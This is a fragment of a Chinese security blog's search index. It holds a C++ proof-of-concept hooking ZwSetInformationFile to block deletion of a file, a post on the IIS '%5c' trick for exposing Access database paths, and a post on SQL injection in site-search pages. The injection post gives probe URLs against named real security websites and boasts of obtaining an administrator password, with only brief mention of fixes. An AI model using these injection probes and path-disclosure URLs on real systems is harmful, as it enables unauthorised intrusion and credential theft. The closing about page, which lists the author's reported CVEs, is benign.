123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104typedef LONG NTSTATUS;#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)typedef struct _IO_STATUS_BLOCK {DWORD Status;ULONG Information;} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;typedef enum _FILE_INFORMATION_CLASS {// end_wdmFileDirectoryInformation = 1,FileFullDirectoryInformation, // 2FileBothDirectoryInformation, // 3FileBasicInformation, // 4 wdmFileStandardInformation, // 5 wdmFileInternalInformation, // 6FileEaInformation, // 7FileAccessInformation, // 8FileNameInformation, // 9FileRenameInformation, // 10FileLinkInformation, // 11FileNamesInformation, // 12FileDispositionInformation, // 13FilePositionInformation, // 14 wdmFileFullEaInformation, // 15FileModeInformation, // 16FileAlignmentInformation, // 17FileAllInformation, // 18FileAllocationInformation, // 19FileEndOfFileInformation, // 20 wdmFileAlternateNameInformation, // 21FileStreamInformation, // 22FilePipeInformation, // 23FilePipeLocalInformation, // 24FilePipeRemoteInformation, // 25FileMailslotQueryInformation, // 26FileMailslotSetInformation, // 27FileCompressionInformation, // 28FileObjectIdInformation, // 29FileCompletionInformation, // 30FileMoveClusterInformation, // 31FileQuotaInformation, // 32FileReparsePointInformation, // 33FileNetworkOpenInformation, // 34FileAttributeTagInformation, // 35FileTrackingInformation, // 36FileMaximumInformation// begin_wdm} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;typedef struct _FILE_NAME_INFORMATION {ULONG FileNameLength;WCHAR FileName[1];} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;typedef NTSTATUS (__stdcall *ZWQUERYINFORMATIONFILE)(IN HANDLE FileHandle,OUT PIO_STATUS_BLOCK IoStatusBlock,OUT PVOID FileInformation,IN ULONG FileInformationLength,IN FILE_INFORMATION_CLASS FileInformationClass);ZWQUERYINFORMATIONFILE ZwQueryInformationFile;NTSTATUS __stdcall Hook_ZwSetInformationFile(IN HANDLE FileHandle,OUT PIO_STATUS_BLOCK IoStatusBlock,IN PVOID FileInformation,IN ULONG FileInformationLength,IN FILE_INFORMATION_CLASS FileInformationClass){NTSTATUS ntstatus = STATUS_ACCESS_DENIED;HMODULE hNtdll = GetModuleHandle(&quot;ntdll.dll&quot;);ZwQueryInformationFile = (ZWQUERYINFORMATIONFILE)GetProcAddress(hNtdll, &quot;ZwQueryInformationFile&quot;);IO_STATUS_BLOCK ioStatus;FILE_NAME_INFORMATION * psi = {0};psi = (FILE_NAME_INFORMATION*)new WCHAR[sizeof(FILE_NAME_INFORMATION) + 1024];memset(psi, 0, (sizeof(FILE_NAME_INFORMATION) + 1024)*2);psi-&gt;FileNameLength = 1024;ntstatus = ZwQueryInformationFile(FileHandle, &amp;ioStatus, psi, sizeof(FILE_NAME_INFORMATION) + 1024 * sizeof(WCHAR),FileNameInformation);if (ntstatus != STATUS_SUCCESS)PrintZwError(&quot;ZwQueryInformationFile&quot;, ntstatus);ntstatus = STATUS_ACCESS_DENIED;if( wcsstr(psi-&gt;FileName, L&quot;b.txt&quot;) == NULL)ntstatus = ((PFZWSETINFORMATIONFILE)(PROC)g_ZwSetInformationFile)(FileHandle,IoStatusBlock,FileInformation,FileInformationLength,FileInformationClass);delete psi;return ntstatus;} 这只是一个证明性代码，要实战的兄弟自己动点手吧。","link":"/cn/ring3_undelete/"},{"title":"N 谈 %5C 暴库","text":"关于%5c的暴库利用想已经不是什么新技术了，原因我只找到含糊的说法：的UNICODE是%5c当提交时,IIS无法正常解析,导致暴库。但我对 http://www.hoky.org 测试成功后（现在已经补上）问过hoky.pro，得知%5c与IIS的设置是有关系的。而在默认设置下是可以暴库的。还有很多人说不成功，我要说的三点： 一般的错误返回页面是本地IE提供的,所以我们先得关了本地的错误页面,具体在菜单项的‘工具-&gt;internet选项-&gt;高级-&gt;显示友好信息’。 对方数据库要是Access型。 %5c的暴库需要的是二级目录，一级目录无法成功。如： http://www.sometips.com%5c1.asp?id=1 不成功http://www.sometips.com/other%5c1.asp?id=1 成功 好了，上面说的大家都知道，当是废话。在暴库这么好用的东西下，如果一个网站只有一级目录的话，难道就没有办法了吗？说到重点，其实一级目录我们也同样可以成功的，我们可以通过构造一个多级目录来达到暴库的目的。 http://www.target.com/noexists/..%5clist.asp?id=1 这样大家就会有新的惊喜了，呵呵。 补救方法也很简单，在conn.asp里 加入数据库文件的位置后面加上这句： 1On Error Resume Next 就可以了。 今天在黑基又看到了关于％5c暴库的文章，这招真的很管用，大概10个网站里会有一个会暴库吧。 关于这个漏洞。绿盟有相关的资料：http://www.nsfocus.net/index.php?act=magazine&amp;do=view&amp;mid=952 呵呵。虽然这个我们这个漏洞呵暴库关系不是很大， 但是明眼人还是看的出相关的地方，IIS 二次解码。大家知道在 url中 \\ 和 / 是一样的，也就是说 http://www.example.com/abc/123.asp?id=5 和 http://www.example.com/abc\\123.asp?id=5 是一样的。 而 http://www.example.com/abc%5c123.asp?id=5 经过一次解码后变成 http://www.example.com/abc\\123.asp?id=5 这里是不会出错的。 而经过 IIS 二次解码后就变成 http://www.example.com/abc%5c123.asp?id=5, 如果数据库连接文件用的相对路径的话。HOO, 找不到数据库文件，当然就出错了。还很老实呢，连物理路径都出来了。大家看。 12345Microsoft JET Database Engine 错误 '80004005''D:\\wwwroot\\hell\\wwwroot\\data\\abc.asp'不是一个有效的路径。 确定路径名称拼写是否正确，以及是否连接到文件存放的服务器。/blog/conn.asp，行29 这个是我暴 Oblog 暴出来的，这个月的黑防大家都有看吧。(早知道我也去投稿了，我发现的比他早多了，郁闷)很多人都在分析成功的条件，就象itbbs里的人讨论的一样。(itbbs最近我怎么上不去啊，知道告诉我) sykkk 认为： 是数据库连接中没有加入容错代码 所以导致错误不能跳过而活生生的把数据文件连接暴出来 对方的IIS没有关闭错误提示 只要关了错误提示就算你怎么暴也没有用 不一定要2级目录 可以自己够造个noexists/..%5C的2级目录 还有就是 要成功一定要调用到数据库 不一定是5c1.asp?id=1 这种类别的 其实还有一个必要条件他忘了，数据库要相对路径，绝对路径是暴不出来的。还有我补充一点应该是 IIS 4.0 或者 IIS 5.0 ，IIS 6 应该是不行了。 关于二级目录，我同意sykkk的看法，有的人说一定是二级目录，呵呵，我可以告诉大家那是错误的。应该是最靠近的asp文件的那个 “/“ 改成 “%5c”, 只有有调用数据库都有可能暴库。哈哈，还有当然对方要没有屏蔽错误信息，要不然你是肯定看不到的。 总结：％5c暴库成功条件 对方服务器用的是 IIS 4.0 或 IIS 5.0， 并且没有屏蔽错误信息。 是数据库连接中没有加入容错代码 所以导致错误不能跳过而活生生的把数据文件连接暴出来 (On Error Resume Next) 应该是Microsoft JET Database Engine 方式 数据库文件调用用的是相对路径！！ 不一定要求是二级目录。三级也是可以的(我有成功过), 二级目录有时候反倒没成功。至于还有构造二级目录，我是没成功过，嘿嘿，应该是错误的。：） 随便也告诉大家，aspx %5c 也有文章的，运用也很巧妙，想知道就 google吧。^_^","link":"/cn/5cAcessPath/"},{"title":"站内搜索写法的一个 SQL inject 漏洞","text":"最近sql inject 可是说是红遍了整个中国，不知道多少网站在sql inject 面前轰然倒下，其实 Sql inject 在国外技术已经很成熟了，而国内则是在近一两年内慢慢走向成熟。在一个个惨痛的实例面前，脚本工作者不得不重视起来，最好的例子就是动网了。然而今天脚本是不是就很安全的呢。请看我对几个安全站点的测试结果。结果是令人吃惊的， 影子鹰， 华夏， 黑客动画吧 都存在着这个站内搜索的漏洞。 请看一段常见的站内搜索写法。 例一： 123456789101112131415161718&lt;form name=&quot;form4&quot; method=&quot;post&quot; action=&quot;search.asp&quot;&gt;&lt;tr&gt;&lt;td height=&quot;25&quot;&gt; &lt;div align=center&gt;&lt;input type=&quot;text&quot; name=&quot;txtfind&quot; size=&quot;18&quot; onMouseOver=&quot;javascript:this.select();&quot; value=&quot;请输入待查信息&quot; style=&quot;border:#333333 1px solid;&quot;&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; &lt;div align=center&gt;&lt;img height=5 src=&quot;../images/left_2.gif&quot; width=186&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td height=&quot;30&quot;&gt; &lt;div align=center&gt;&lt;select name=&quot;s1&quot;&gt;&lt;option selected value='0'&gt;所有类别&lt;/option&gt;&lt;option value='1'&gt;网站新闻&lt;/option&gt;&lt;option value='2'&gt;进阶教程&lt;/option&gt;&lt;option value='3'&gt;安全漏洞&lt;/option&gt;&lt;option value='5'&gt;系统防范&lt;/option&gt;&lt;option value='6'&gt;原创作品&lt;/option&gt;&lt;/select&gt; 上面的这段来自影子鹰安全网, 也许看了人说没什么的啊，我也是这么写的，这和sql inject 有什么关系啊。其实问题就出在这, 搜索类别的值是从客户端获得的，而且没有过滤。那么聪明的你是否想到了什么？ 我们可以构造一个url http://www.cnhacker.cn/search.asp?s1=1 得到的结果是： 页面返回正常，得到一大堆的搜索结果。 提交 http://www.cnhacker.cn/search.asp?s1=1 and 1＝1 返回正常提交 http://www.cnhacker.cn/search.asp?s1=1 and 1＝2 没有搜索到任何相关文章 ，请重新搜索 哈哈，可以注入！像这些安全站点密码一定n变态，还是用nb跑跑吧。后面也证明了我的想法是正确的密码n变态，还好没手工猜。拿到了管理员的密码，就是找不到后台郁闷。 例二： 1&lt;a href='Soft_Class.asp?ClassID=11'&gt;安全扫描&lt;/a&gt;&lt;/li&gt;&lt;br&gt;&lt;li&gt;&lt;a href='Soft_Class.asp?ClassID=12'&gt;嗅探监听&lt;/a&gt;&lt;/li&gt;&lt;br&gt;&lt;li&gt;&lt;a href='Soft_Class.asp?ClassID=13'&gt;分析检测&lt;/a&gt;&lt;/li&gt;&lt;br&gt;&lt;li&gt;&lt;a href='Soft_Class.asp?ClassID=14'&gt;字典文档&lt;/a&gt;&lt;/li&gt;&lt;br&gt;&lt;li&gt;&lt;a href='Soft_Class.asp?ClassID=15'&gt;加密破解&lt;/a&gt;&lt;/li&gt;&lt;br&gt;&lt;li&gt;&lt;a href='Soft_Class.asp?ClassID=16'&gt;木马类&lt;/a&gt;&lt;/li&gt;&lt;br&gt;&lt;li&gt;&lt;a href='Soft_Class.asp?ClassID=17'&gt;QQ类&lt;/a&gt;&lt;/li&gt;&lt;br&gt;&lt;li&gt;&lt;a href='Soft_Class.asp?ClassID=18'&gt;综合工具&lt;/a&gt;&lt;/li&gt; 上面代码来自黑客动画吧，令人吃惊的直接就是classID= 根本就没有过滤。分析完上面的代码，和其他的一些代码综合起来, 我们又可以构造这样的url: http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8 结果返回也是一定堆的搜索结果。。。 提交 http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8 and 1＝1 返回正常提交 http://www.hack58.com/Soft_Search.asp?Field=SoftName&amp;ClassID=8 and 1＝2 产生错误的可能原因： HOO，漏洞又出来了！ 例三： 来个大家都知道的华夏黑客联盟，前段时间还被黑了一次。还是看代码吧，听说华夏用的是动力的商业版。可以华夏今天又上不去，反正原理是相同的。我把我构造好的url 给大家看 http://www.77169.org/soft1/search.asp?ss_name=winrar&amp;sor=01 接下来要怎么发挥就看你们的了。 总结：这个漏洞应该有一定的普遍性，黑窝里安全站点都有这个问题，更别说是其他站点了。或许有些大虾早就发现了，小弟就在这献丑一下了，第一次写文章，有所差错在所难免，欢迎和我联系。","link":"/cn/search_sql_injection/"}],"tags":[{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"Crack","slug":"Crack","link":"/tags/Crack/"},{"name":"Archives","slug":"Archives","link":"/tags/Archives/"},{"name":"Life","slug":"Life","link":"/tags/Life/"},{"name":"Security","slug":"Security","link":"/tags/Security/"},{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"investment","slug":"investment","link":"/tags/investment/"},{"name":"Malware","slug":"Malware","link":"/tags/Malware/"},{"name":"PKM","slug":"PKM","link":"/tags/PKM/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"ai","slug":"ai","link":"/tags/ai/"},{"name":"Software","slug":"Software","link":"/tags/Software/"},{"name":"Programming","slug":"Programming","link":"/tags/Programming/"},{"name":"vim","slug":"vim","link":"/tags/vim/"}],"categories":[],"pages":[{"title":"关于我","text":"对网络安全和金融投资有兴趣的程序员。 记笔记 ：Logseq, flomo 写文章 ：Obsidian 听播客 ：Pocket Casts 聊群组 ：Discord 看资讯 ：Reddit, Telegram 编辑器 : vim , neovim 输入法 ：Rime , Gboard 浏览器 ：Chrome 操作系统 ：Fedora，Android ☆ VulnerabilitiesChrome[1105720] High CVE-2020-6540: Heap buffer overflow in Skia[1091670] Medium CVE-2020-6525: Heap buffer overflow in Skia[1092274] Medium CVE-2020-6520: Heap buffer overflow in Skia[966263 ] Low CVE-2019-5854: signed integer overflow in PDFium[964872 ] Medium CVE-2019-5855: signed integer overflow in PDFium[954891 ] Medium CVE-2019-5849: OOB Read in Skia[908292 ] Medium CVE-2019-5772: heap-use-after-free in PDFium[880675 ] Medium CVE-2018-17469: heap-buffer-overflow in PDFium[874359 ] Medium CVE-2018-17461: heap-buffer-overflow in PDFium[850350 ] High CVE-2018-6153: stack-buffer-overflow in Skia AndroidCritical CVE-2017-0406: Remote code execution vulnerability in Mediaserver vlc[CVE-2020-26664][CVE-2021-25801][CVE-2021-25802][CVE-2021-25803][CVE-2021-25804] ImageMagick / GraphicsMagick[CVEs] ☆ Open Source Software[Tcp DNS proxy][Chrome proxy helper][SQLi Scanner]","link":"/about/index.html"},{"title":"","text":"","link":"/ads/in_article.html"},{"title":"tags","text":"","link":"/tags/index.html"}]}